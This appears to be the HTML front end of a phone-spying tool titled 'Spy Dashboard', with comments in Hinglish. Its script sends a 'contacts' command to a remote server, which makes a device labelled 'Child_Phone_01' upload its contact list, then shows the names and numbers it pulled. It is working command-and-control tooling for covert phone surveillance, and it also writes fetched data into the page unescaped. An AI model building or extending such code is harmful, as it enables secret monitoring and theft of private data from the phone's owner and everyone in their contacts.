<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts - Spy Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px;
            padding: 20px;
            border: 1px solid var(--glass-border);
            min-height: 80vh;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between; /* Space between title and refresh btn */
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--glass-border);
        }

        .header-left { display: flex; align-items: center; }

        .back-btn {
            color: var(--text-main);
            font-size: 1.2rem;
            text-decoration: none;
            margin-right: 15px;
        }

        .page-title {
            font-size: 1.2rem;
            font-weight: bold;
        }

        .refresh-btn {
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            color: var(--text-main);
            padding: 8px 12px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: 0.3s;
        }
        .refresh-btn:hover { background: var(--accent); border-color: var(--accent); }

        /* Contact List Styling */
        .contact-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
            max-height: 600px;
            overflow-y: auto;
        }

        .contact-card {
            background: var(--glass-bg);
            padding: 15px;
            border-radius: 15px;
            display: flex;
            align-items: center;
            border: 1px solid var(--glass-border);
        }

        .avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(45deg, #4caf50, #2e7d32);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
            font-size: 1.1rem;
        }

        .info { flex: 1; }
        .name { font-size: 1rem; font-weight: 500; }
        .number { font-size: 0.85rem; color: var(--text-muted); margin-top: 2px; }

        .call-icon {
            color: var(--accent);
            font-size: 1.2rem;
            padding: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="header-left">
                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
                <span class="page-title">Contacts List</span>
            </div>
            <button class="refresh-btn" onclick="requestNewContacts()">
                <i class="fa-solid fa-arrows-rotate"></i> Sync
            </button>
        </div>

        <div class="contact-list" id="contactsContainer">
            <div style="text-align: center; color: #666; margin-top: 50px;">
                <i class="fa-solid fa-spinner fa-spin"></i> Loading contacts...
            </div>
        </div>
    </div>

    <script>
        // âœ… SERVER SETUP (Same as Index.html)
        const RENDER_URL = "https://child-v9no.onrender.com";
        const DEVICE_ID = "Child_Phone_01";

        // 1. Contacts Fetch karne ka function
        function loadContacts() {
            // Naye server ke hisab se API endpoint: /api/get-data/:id/:type
            fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/contacts`)
                .then(response => response.json())
                .then(data => {
                    const container = document.getElementById("contactsContainer");
                    container.innerHTML = ""; // Clear loading text

                    // Agar koi data nahi aaya ya list empty hai
                    if(!data || data.length === 0) {
                        container.innerHTML = `
                            <div style='text-align:center; padding:20px; color: #aaa;'>
                                <p>No contacts found yet.</p>
                                <p style="font-size: 0.8rem;">Click 'Sync' button to request data from phone.</p>
                            </div>`;
                        return;
                    }

                    // Loop through data
                    data.forEach(contact => {
                        const initial = contact.name ? contact.name.charAt(0).toUpperCase() : "#";
                        const name = contact.name || "Unknown";
                        const number = contact.number || "No Number";

                        const card = `
                            <div class="contact-card">
                                <div class="avatar">${initial}</div>
                                <div class="info">
                                    <div class="name">${name}</div>
                                    <div class="number">${number}</div>
                                </div>
                                <a href="tel:${number}" class="call-icon" style="text-decoration:none;">
                                    <i class="fa-solid fa-phone"></i>
                                </a>
                            </div>
                        `;
                        container.innerHTML += card;
                    });
                })
                .catch(err => {
                    console.error("Error:", err);
                    document.getElementById("contactsContainer").innerHTML = 
                        "<div style='text-align:center; color:#ff4444; margin-top:20px;'>Server not responding.<br>Check internet.</div>";
                });
        }

        // 2. Phone ko Command bhejna (Agar list khali ho to)
        function requestNewContacts() {
            const btn = document.querySelector('.refresh-btn');
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sent...';
            
            fetch(`${RENDER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
            })
            .then(res => res.json())
            .then(data => {
                alert("Command sent! Wait 10-20 seconds, then refresh page.");
                setTimeout(() => { btn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> Sync'; }, 2000);
            });
        }

        // Page khulte hi contacts load karo
        loadContacts();

    </script>
</body>
</html>
